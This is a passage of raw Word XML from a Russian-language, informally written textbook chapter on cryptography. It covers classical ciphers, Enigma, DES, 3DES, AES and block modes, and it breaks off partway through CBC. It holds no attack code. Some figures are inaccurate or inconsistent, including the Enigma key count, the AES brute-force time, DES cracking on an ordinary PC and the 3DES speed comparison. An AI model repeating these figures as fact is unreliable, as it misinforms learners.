        <w:t>Когда ты заходишь на сайт банка (HTTPS), между тобой и сервером летят номера карт, пароли, суммы переводов. Без шифрования любой сосед по Wi-Fi мог бы это перехватить.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Когда ты отправляешь сообщение в Telegram, оно шифруется (E2E — end-to-end), чтобы даже сам Telegram не мог его прочитать (ну, в теории).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Когда ты хранишь пароли в базе данных, их нельзя сохранять в открытом виде. Нужно хэшировать (об этом ниже).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Когда ты подписываешь документ электронной подписью, криптография гарантирует, что это именно ты и документ не изменён.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальные примеры провалов без криптографии:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2012 год — LinkedIn: утекло **6.5 миллионов паролей**. Почему? Хранили в виде SHA-1 хэшей **без соли**. Хакеры за неделю восстановили 90% паролей.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2014 год — Sony Pictures: хакеры украли 100 терабайт данных (фильмы, переписка, зарплаты). Сервера не шифровали диски, данные передавались по незашифрованному FTP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2017 год — Equifax: не обновили Apache Struts. Данные 147 млн человек утекли. Даже если бы утекли — **зашифрованные данные** были бы бесполезны без ключа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В этой главе мы разберём:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Краткую историю криптографии (от Цезаря до RSA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Симметричное шифрование (AES — твой лучший друг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Асимметричное шифрование (RSA, ECC — как работает HTTPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хэш-функции (SHA-256, bcrypt — как хранить пароли правильно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цифровые подписи (как доказать, что документ не подделан)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сертификаты и PKI (зелёный замочек в браузере)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Протоколы безопасности (TLS/SSL, SSH, VPN, PGP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Квантовая криптография (почему через 10-20 лет всё сломается)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.01 (Политика безопасности)** — криптография как техническая мера защиты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.03 (Угрозы ИБ)** — от чего защищает шифрование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.05 (Атаки)** — криптоанализ, атаки на шифрование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.04 (Протоколы Internet)** — HTTPS, SSH, TLS/SSL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 7.02 (БД)** — шифрование баз данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2.1. Краткая история криптографии: от Цезаря до квантовых компьютеров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Древние времена: "Это работает, пока враг тупой"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шифр Цезаря</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (I век до н.э.):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Юлий Цезарь шифровал послания своим генералам простейшим способом: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сдвигал каждую букву на 3 позиции</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в алфавите.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Открытый текст:  ATTACK AT DAWN</w:t>
        <w:br/>
        <w:t>Шифротекст:      DWWDFN DW GDZQ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип</w:t>
      </w:r>
      <w:r>
        <w:t>: A→D, B→E, C→F, ... , Z→C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Взлом</w:t>
      </w:r>
      <w:r>
        <w:t>: Всего 25 вариантов сдвига (для латиницы). Перебрать вручную за 5 минут.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Нормально для античности, но сегодня это уровень школьной олимпиады.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шифр Виженера</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (XVI век):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Чуть хитрее: используем </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кодовое слово</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ключ). Каждая буква ключа определяет сдвиг для соответствующей буквы текста.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Открытый текст:  ATTACKATDAWN</w:t>
        <w:br/>
        <w:t>Ключ:            LEMONLEMONLE</w:t>
        <w:br/>
        <w:t>Шифротекст:      LXFOPVEFRNHR</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип</w:t>
      </w:r>
      <w:r>
        <w:t>: первая буква текста A сдвигается на L (12-я буква алфавита), вторая T на E (5-я), и т.д.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Взлом</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: До XIX века считался невзламываемым ("le chiffre indéchiffrable"). Потом придумали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>частотный анализ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — если ключ короче текста, он повторяется, а паттерны выдают себя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Энигма</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Вторая мировая война):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Машина Энигма</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Германия, 1930-40-е) — электромеханическое устройство для шифрования. Использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>роторы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (3-5 штук), которые вращаются после каждой буквы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Количество вариантов</w:t>
      </w:r>
      <w:r>
        <w:t>: ~10^23 (150 квинтиллионов комбинаций).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Взлом</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Алан Тьюринг и команда в Блетчли-парк построили </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Bombe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — электромеханический компьютер для взлома Энигмы. Это сократило Вторую мировую на ~2 года (по оценкам историков).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок</w:t>
      </w:r>
      <w:r>
        <w:t>: Даже самые крутые шифры взламываются, если:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Есть ошибки в использовании** (немцы иногда отправляли тестовые сообщения с известным текстом)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Есть достаточно вычислительной мощности**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Современная криптография (1970-е – наши дни)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1976 год — Диффи и Хеллман</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> публикуют статью </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"New Directions in Cryptography"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, где предлагают концепцию </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>асимметричного шифрования</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (публичный и приватный ключ). Это революция.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1977 год — RSA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Rivest, Shamir, Adleman) — первый практический асимметричный алгоритм. Используется до сих пор (HTTPS, SSH, электронная подпись).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2001 год — AES</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Advanced Encryption Standard) становится стандартом симметричного шифрования (заменил устаревший DES).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2010-е — ECC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Elliptic Curve Cryptography) — более короткие ключи, но такая же стойкость. Используется в биткоине, современных смартфонах, IoT.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2020-е — Постквантовая криптография</w:t>
      </w:r>
      <w:r>
        <w:t>: NIST выбирает алгоритмы, которые выдержат атаки квантовых компьютеров (CRYSTALS-Kyber, CRYSTALS-Dilithium).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2.2. Симметричное шифрование: один ключ для всех</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Симметричное шифрование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это когда </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один и тот же ключ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> используется для шифрования и расшифрования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t>: У тебя и у друга есть одинаковый замок и два одинаковых ключа. Ты закрываешь сообщение замком, друг открывает своим ключом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚡ **Быстро** (в 100-1000 раз быстрее асимметричного)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🛡️ **Стойко** (при правильном использовании)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🔑 **Проблема распределения ключей**: как передать ключ собеседнику по незащищённому каналу? Если перехватят ключ — всё, пиздец, все данные расшифруются.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>DES (Data Encryption Standard)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 1977  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разработчик</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: IBM + NSA  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Длина ключа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>56 бит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Размер блока</w:t>
      </w:r>
      <w:r>
        <w:t>: 64 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>История</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 1970-х 56 бит казались достаточными. В 1998 году Electronic Frontier Foundation построила компьютер </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Deep Crack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, который взломал DES за </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>56 часов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Сегодня можно взломать за </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>несколько часов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на обычном ПК.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DES устарел и опасен</w:t>
      </w:r>
      <w:r>
        <w:t>. Не используй его.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3DES (Triple DES)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 1998  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Длина ключа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 112 или 168 бит  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Применяем DES </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>три раза</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с разными ключами:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ciphertext = DES_encrypt(K3, DES_decrypt(K2, DES_encrypt(K1, Plaintext)))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 3 раза медленнее DES, а значит в 9 раз медленнее AES. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Не используй</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (deprecated с 2023 года).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>AES (Advanced Encryption Standard) — твой выбор</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 2001  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разработчик</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Rijndael (бельгийцы Joan Daemen и Vincent Rijmen)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Длина ключа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 128, 192 или 256 бит  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Размер блока</w:t>
      </w:r>
      <w:r>
        <w:t>: 128 бит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему AES — король?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Быстрый**: аппаратное ускорение (инструкция AES-NI в процессорах Intel/AMD с 2010 года)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Стойкий**: Ни одной практической атаки за 20+ лет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Стандарт**: используется везде (Wi-Fi WPA2/WPA3, BitLocker, FileVault, HTTPS, SSH, архиваторы 7-Zip/WinRAR)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает AES</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (упрощённо):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Разбиваем текст на блоки** по 128 бит (16 байт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Применяем раунды преобразований** (10/12/14 раундов для 128/192/256-битного ключа):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SubBytes (замена байтов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ShiftRows (сдвиг строк)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MixColumns (перемешивание столбцов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>AddRoundKey (XOR с ключом)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Получаем зашифрованный блок**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность взлома</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Для AES-128: 2^128 вариантов = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>340 ундециллионов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (340 000 000 000 000 000 000 000 000 000 000 000 000). Если перебирать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>миллиард ключей в секунду</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, понадобится </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10^25 лет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (возраст Вселенной — 13.8 миллиардов лет). Так что расслабься.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Режимы работы AES</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: AES шифрует блоки по 128 бит. Но текст может быть длиннее. Как шифровать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. ECB (Electronic Codebook) — НЕ ИСПОЛЬЗУЙ!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Каждый блок шифруется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>независимо</w:t>
      </w:r>
      <w:r>
        <w:t>. Одинаковые блоки → одинаковый шифротекст.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример провала</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Оригинал изображения:  🐧 Linux Tux (чёрно-белый пингвин)</w:t>
        <w:br/>
        <w:t>После шифрования ECB:  👻 Контуры пингвина видны!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Гуглишь "ECB penguin" — там картинка, которая стала мемом в криптографии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: ECB — говно. Не используй.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. CBC (Cipher Block Chaining) — OK</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Каждый блок </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>XOR'ится</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с предыдущим шифротекстом перед шифрованием. Первый блок XOR'ится с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IV</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Initialization Vector) — случайным 128-битным числом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>C[0] = AES(P[0] ⊕ IV)</w:t>
        <w:br/>
        <w:t>C[1] = AES(P[1] ⊕ C[0])</w:t>
        <w:br/>
        <w:t>C[2] = AES(P[2] ⊕ C[1])</w:t>
        <w:br/>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
